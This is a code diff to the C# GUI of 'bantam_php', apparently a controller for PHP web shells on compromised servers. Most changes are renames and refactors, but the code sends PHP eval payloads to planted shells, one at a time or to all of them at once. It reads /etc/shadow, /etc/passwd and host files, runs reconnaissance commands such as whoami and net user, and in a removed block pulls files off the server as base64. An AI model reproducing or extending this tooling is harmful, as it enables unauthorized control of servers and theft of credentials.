@@ -69,16 +69,16 @@ namespace bantam_php
         /// </summary>
         /// <param name="shellUrl"></param>
         /// <param name="pingMS"></param>
-        public void addClientMethod(string shellUrl, string pingMS)
+        public void AddShellToListView(string shellUrl, string pingMS)
         {
             ListViewItem lvi = new ListViewItem(new string[] { shellUrl, pingMS + " ms" }) {
                 Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))
             };
-            listViewClients.Items.Add(lvi);
+            listViewShells.Items.Add(lvi);
 
             if (pingMS == "-") {
-                int lastIndex = listViewClients.Items.Count - 1;
-                listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;
+                int lastIndex = listViewShells.Items.Count - 1;
+                listViewShells.Items[lastIndex].BackColor = System.Drawing.Color.Red;
 
                 Shells[shellUrl].down = true;
             }
@@ -90,9 +90,9 @@ namespace bantam_php
         /// <param name="shellURL"></param>
         public void guiCallbackRemoveShellURL(string shellURL)
         {
-            ListViewItem selectedLvi = listViewClients.FindItemWithText(shellURL);
+            ListViewItem selectedLvi = listViewShells.FindItemWithText(shellURL);
             if (selectedLvi != null) {
-                listViewClients.FindItemWithText(shellURL).Remove();
+                listViewShells.FindItemWithText(shellURL).Remove();
             }
         }
 
@@ -138,7 +138,7 @@ namespace bantam_php
                 pingWatch.Start();
 
                 if (!Helper.IsValidUri(shellUrl)) {
-                    addClientMethod(shellUrl, "-");
+                    AddShellToListView(shellUrl, "-");
                     return;
                 }
 
@@ -160,17 +160,17 @@ namespace bantam_php
                         var initDataReturnedVarCount = Enum.GetValues(typeof(PhpHelper.INIT_DATA_VARS)).Cast<PhpHelper.INIT_DATA_VARS>().Max();
 
                         if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
-                            addClientMethod(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
+                            AddShellToListView(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
                             Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
                         } else {
-                            addClientMethod(shellUrl, "-");
+                            AddShellToListView(shellUrl, "-");
                         }
                     } else {
-                        addClientMethod(shellUrl, "-");
+                        AddShellToListView(shellUrl, "-");
                     }
                     pingWatch.Stop();
                 } else {
-                    addClientMethod(shellUrl, "-");
+                    AddShellToListView(shellUrl, "-");
                 }
             }
         }
@@ -189,7 +189,7 @@ namespace bantam_php
             string userAgent = "User Agent: " + WebHelper.g_GlobalDefaultUserAgent;
             string newUserAgent = GuiHelper.UserAgentSwitcher(userAgent, "Change User Agent");
 
-            if (newUserAgent != "") {
+            if (!string.IsNullOrEmpty(newUserAgent)) {
                 WebHelper.g_GlobalDefaultUserAgent = newUserAgent;
             }
         }
@@ -210,7 +210,7 @@ namespace bantam_php
             bool encryptResponse = Shells[shellUrl].responseEncryption;
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
-            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, "", ref checkBoxChecked);
+            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
 
             if (string.IsNullOrEmpty(code) == false) {
                 if (checkBoxChecked) {
@@ -229,9 +229,9 @@ namespace bantam_php
         private void evalToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             bool bShow = false;
-            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", "", ref bShow);
+            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref bShow);
 
-            foreach (ListViewItem lvClients in listViewClients.Items) {
+            foreach (ListViewItem lvClients in listViewShells.Items) {
                 string shellUrl = lvClients.Text;
                 if (Shells.ContainsKey(shellUrl)) {
                     bool encryptResponse = Shells[shellUrl].responseEncryption;
@@ -248,7 +248,13 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void viewPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].responseEncryption;
+            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
+            string phpCode = PhpHelper.ReadFileFromVar(PhpHelper.phpServerScriptFileName, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Bantam PHP Code", encrypt, responseEncryptionMode);
         }
 
         /// <summary>
@@ -265,7 +271,8 @@ namespace bantam_php
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].responseEncryption;
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
-            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
+
+            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);
 
             if (lvi != null
             && (Shells[shellUrl].pingStopwatch == null || Shells[shellUrl].pingStopwatch.IsRunning == false)) {
@@ -348,7 +355,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
         {
-            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
+            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);
             if (lvi != null) {
                 //copy a backup of the current file tree view into clients
                 if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {
@@ -372,7 +379,7 @@ namespace bantam_php
 
                 g_SelectedShellUrl = lvi.SubItems[0].Text;
 
-                foreach (ListViewItem lvClients in listViewClients.Items) {
+                foreach (ListViewItem lvClients in listViewShells.Items) {
                     //todo store color and revert to original color, for now skip if red
                     if (lvClients.BackColor != System.Drawing.Color.Red) {
                         lvClients.BackColor = System.Drawing.SystemColors.Window;
@@ -507,14 +514,14 @@ namespace bantam_php
         private void removeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
-                listViewClients.SelectedItems[0].Remove();
+                listViewShells.SelectedItems[0].Remove();
                 if (Shells.ContainsKey(g_SelectedShellUrl)) {
                     Shells.Remove(g_SelectedShellUrl);
                 }
             }
         }
 
-        private async void pingToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void pingToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl)
              || Shells.ContainsKey(g_SelectedShellUrl) == false) {
@@ -527,7 +534,7 @@ namespace bantam_php
             bool encryptResponse = Shells[shellURL].responseEncryption;
             int responseEncryptionMode = Shells[shellURL].responseEncryptionMode;
 
-            listViewClients.FindItemWithText(shellURL).Remove();
+            listViewShells.FindItemWithText(shellURL).Remove();
             Shells.Remove(shellURL);
 
             Shells.Add(shellURL, new ShellInfo());
@@ -569,7 +576,7 @@ namespace bantam_php
             }) 
             {
                 if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
-                    foreach (ListViewItem lvClients in listViewClients.Items) {
+                    foreach (ListViewItem lvClients in listViewShells.Items) {
                         if (Shells.ContainsKey(lvClients.Text)) {
                             Shells.Remove(lvClients.Text);
                         }
@@ -697,7 +704,7 @@ namespace bantam_php
                         if (columns[columns.Length - 2] == "dir") {
                             //if the user switched targets we do not update the live filebrowser because it is for a different target
                             if (g_SelectedShellUrl == shellUrl) {
-                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
+                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add(string.Empty, columns[0], 0);
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -707,7 +714,7 @@ namespace bantam_php
                                 }
                             } else {
                                 //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
-                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add("", columns[0], 0);
+                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add(string.Empty, columns[0], 0);
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -719,7 +726,7 @@ namespace bantam_php
                         } else {
                             //if the user switched targets we do not update the live filebrowser because it is for a different target
                             if (g_SelectedShellUrl == shellUrl) {
-                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
+                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add(string.Empty, columns[0], 6);
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -729,7 +736,7 @@ namespace bantam_php
                                 }
                             } else {
                                 //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
-                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add("", columns[0], 6);
+                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add(string.Empty, columns[0], 6);
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -783,7 +790,7 @@ namespace bantam_php
                     if (drives != null && drives.Length > 0) {
                         treeViewFileBrowser.Nodes.Clear();
                         foreach (string drive in drives) {
-                            treeViewFileBrowser.Nodes.Add("", drive, 3);
+                            treeViewFileBrowser.Nodes.Add(string.Empty, drive, 3);
                         }
                     }
                 } else {
@@ -816,7 +823,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
+        private void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StartFileBrowser();
         }
@@ -928,7 +935,7 @@ namespace bantam_php
 
                                     if (columns[columns.Length - 2] == "dir") {
                                         if (shellUrl == g_SelectedShellUrl) {
-                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
+                                            TreeNode lastTn = tn.Nodes.Add(string.Empty, columns[0], 0);
                                             lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                             if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -941,7 +948,7 @@ namespace bantam_php
                                         }
                                     } else {
                                         if (shellUrl == g_SelectedShellUrl) {
-                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
+                                            TreeNode lastTn = tn.Nodes.Add(string.Empty, columns[0], 6);
                                             if (string.IsNullOrEmpty(columns[2]) == false) {
                                                 lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                             } else {
@@ -1007,7 +1014,20 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <returns></returns>
         private string fileBrowserGetFileName()
+        {
+            return treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <returns></returns>
+        private string fileBrowserGetFileNameAndPath()
         {
             string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
             return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
@@ -1018,14 +1038,14 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
+        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
-            string name = fileBrowserGetFileName();
-            string phpCode = PhpHelper.ReadFileProcedure(name, encrypt);
+            string name = fileBrowserGetFileNameAndPath();
+            string phpCode = PhpHelper.ReadFile(name, encrypt);
         
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, "Viewing File -" + name, encrypt, responseEncryptionMode);
         }
@@ -1042,11 +1062,11 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            string fileName = fileBrowserGetFileName();
+            string fileName = fileBrowserGetFileNameAndPath();
             bool encryptResponse = Shells[shellUrl].responseEncryption;
             string newFileName = GuiHelper.RenameFileDialog(fileName, "Renaming File");
 
-            if (newFileName != "") {
+            if (!string.IsNullOrEmpty(newFileName)) {
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
@@ -1066,7 +1086,7 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            string path = fileBrowserGetFileName();
+            string path = fileBrowserGetFileNameAndPath();
             bool encryptResponse = Shells[shellUrl].responseEncryption;
 
             DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", 
@@ -1091,7 +1111,7 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            string fileName = fileBrowserGetFileName();
+            string fileName = fileBrowserGetFileNameAndPath();
             bool encryptResponse = Shells[shellUrl].responseEncryption;
 
             string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");
@@ -1102,43 +1122,6 @@ namespace bantam_php
             }
         }
 
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private async void downloadFileAsToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            if (validTarget() == false) {
-                return;
-            }
-
-            string shellUrl = g_SelectedShellUrl;
-            string fileName = fileBrowserGetFileName();
-            bool encryptResponse = Shells[shellUrl].responseEncryption;
-            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
-
-            SaveFileDialog downloadFileDialog = new SaveFileDialog {
-                RestoreDirectory = true
-            };
-
-            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
-                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
-                    string phpCode = "@$result = base64_encode(file_get_contents('" + fileName + "'));";
-                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
-
-                    if (string.IsNullOrEmpty(response.Result) == false) {
-                        string result = response.Result;
-                        if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
-                        }
-                        byte[] fileBytes = Helper.DecodeBase64(result);
-                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
-                    }
-                }
-            }
-        }
 
         /// <summary>
         /// Scrolls to the end of the Console Output Richtext box on update
@@ -1169,7 +1152,10 @@ namespace bantam_php
         /// <param name="e"></param>
         private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
+            if (validTarget() == false) {
+                return;
+            }
+            Clipboard.SetText(g_SelectedShellUrl);
         }
 
         /// <summary>
@@ -1216,7 +1202,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
+        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false) {
                 return;
@@ -1239,7 +1225,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void windowsNetuserMenuItem_Click(object sender, EventArgs e)
+        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.windowsOS_NetUser;
@@ -1255,7 +1241,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
+        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.windowsOS_NetAccounts;
@@ -1271,7 +1257,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
+        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.windowsOS_Ipconfig;
@@ -1287,7 +1273,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
+        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.windowsOS_Ver;
@@ -1303,7 +1289,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
+        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.posixOS_Whoami;
@@ -1319,7 +1305,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
+        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.linuxOS_Ifconfig;
@@ -1338,11 +1324,11 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void windowsTargetsMenuItem_Click(object sender, EventArgs e)
+        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.windowsFS_hostTargets, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.windowsFS_hostTargets, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.windowsFS_hostTargets, encrypt, responseEncryptionMode);
@@ -1353,11 +1339,11 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
+        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_NetworkInterfaces, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_NetworkInterfaces, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_NetworkInterfaces, encrypt, responseEncryptionMode);
@@ -1368,11 +1354,11 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void linusVersionMenuItem_Click(object sender, EventArgs e)
+        private void linusVersionMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_ProcVersion, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ProcVersion, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ProcVersion, encrypt, responseEncryptionMode);
@@ -1383,11 +1369,11 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void linuxhostsMenuItem_Click(object sender, EventArgs e)
+        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_hostTargetsFile, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_hostTargetsFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_hostTargetsFile, encrypt, responseEncryptionMode);
@@ -1398,11 +1384,11 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
+        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_IssueFile, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_IssueFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_IssueFile, encrypt, responseEncryptionMode);
@@ -1413,14 +1399,19 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void shadowToolStripMenuItem_Click(object sender, EventArgs e)
+        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_ShadowFile, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ShadowFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ShadowFile, encrypt, responseEncryptionMode);
+        }
+
+        private void downloadFileAsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
         }
 
         /// <summary>
@@ -1428,11 +1419,11 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private async void passwdToolStripMenuItem_Click(object sender, EventArgs e)
+        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_PasswdFile, Shells[shellUrl].responseEncryption);
+            string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_PasswdFile, Shells[shellUrl].responseEncryption);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_PasswdFile, encrypt, responseEncryptionMode);
